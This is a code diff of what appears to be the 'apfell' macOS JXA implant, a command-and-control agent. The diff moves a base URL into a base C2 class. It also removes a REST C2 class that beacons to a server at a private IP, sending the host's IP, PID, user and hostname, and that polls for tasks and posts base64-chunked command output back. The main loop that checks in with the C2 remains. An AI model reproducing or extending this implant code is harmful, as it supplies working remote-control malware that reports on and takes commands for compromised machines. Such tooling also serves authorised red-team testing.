@@ -27,14 +27,15 @@ class implant{
 	}
 }
 apfell = new implant();
-//--------------Basic C2 INFORMATION----------------------------------------
-//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes
+//--------------Base C2 INFORMATION----------------------------------------
 class baseC2{
 	//To create your own C2, extend this class and implement the required functions
 	//The main code depends on the mechanism being C2 with these functions.
 	//   the implementation of the functions doesn't matter though
-	constructor(interval){
+	//   You're welcome to add additional functions as well, but this is the minimum
+	constructor(interval, baseurl){
 		this.interval = interval; //seconds between callbacks
+		this.baseurl = baseurl; //where to reach out to
 	}
 	getInterval(){
 		return this.interval;
@@ -55,84 +56,11 @@ class baseC2{
 		//updates the current configuration for how to get tasking
 	}
 }
-//-------------RESTFUL C2 mechanisms ---------------------------------
-class RestC2 extends baseC2{
-	constructor(interval, baseurl){
-		super(interval);
-		this.baseurl = baseurl;
-	}
-	checkin(ip, pid, user, host){
-		//get info about system to check in initially
-		//needs IP, PID, user, host, payload_type
-		//gets back a unique ID
-		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
-		//calls htmlPostData(url,data) to actually checkin
-		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));
-		apfell.id = jsondata.id;
-		return jsondata;
-	}
-	getTasking(){
-		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
-		var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
-		var task = this.htmlGetData(url);
-		return JSON.parse(task);
-	}
-	postResponse(urlEnding, data){
-		//depending on the amount of data we're sending, we might need to chunk it
-		//  current chunks at 5kB, but we can change that later
-		var size=5000;
-		//console.log("total response size: " + data.length);
-		for(var i = 0; i < data.length; i+=size){
-			//console.log(i);
-			var chunk = data.substring(i,i+size);
-			//console.log(chunk);
-			//base64 encode each chunk before we send it
-			var chunk_nsstring = $.NSString.alloc.initWithCStringEncoding(chunk, $.NSData.NSUnicodeStringEncoding);
-			//console.log(chunk_nsstring);
-			var data_chunk = chunk_nsstring.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
-			//console.log(data_chunk);
-			var encoded_chunk = data_chunk.base64EncodedStringWithOptions(0).js;
-			//console.log(encoded_chunk);
-			var post_data = {"response":encoded_chunk};
-			var jsondata = this.htmlPostData(urlEnding, JSON.stringify(post_data));
-			//console.log("returned data: " + JSON.stringify(jsondata));
-		}
-		return jsondata;
-	}
-	htmlPostData(urlEnding, sendData){
-		while(true){
-			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
-				//console.log("posting: " + sendData + " to " + urlEnding);
-				var url = this.baseurl + urlEnding;
-				//console.log(url);
-				var data = $.NSString.alloc.initWithUTF8String(sendData);
-				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
-				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
-				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
-				var postLength = $.NSString.stringWithFormat("%d", postData.length);
-				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
-				req.setHTTPBody(postData);
-				var response = Ref();
-				var error = Ref();
-				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
-				var resp = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
-				//console.log(resp);
-				var jsondata = JSON.parse(resp);
-				return jsondata;
-			}
-			catch(error){
-			}
-		}
-	}
-	htmlGetData(url){
-		return ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
-	}
-}
-C2 = new RestC2(10, "https://192.168.0.119:443/"); //defaulting to 10 second callbacks
+//------------- C2Profile -------------------------------------------
 //-------------MAIN EXECUTION LOOP ----------------------------------
 for(var i=0; i < apfell.ip.length; i++){
 	ip = apfell.ip[i];
-	if (ip.js.includes(".") && ip.js != "127.0.0.1"){
+	if (ip.js.includes(".") && ip.js != "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
 		//console.log("found ip, checking in");
 		C2.checkin(ip.js,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
 		break;
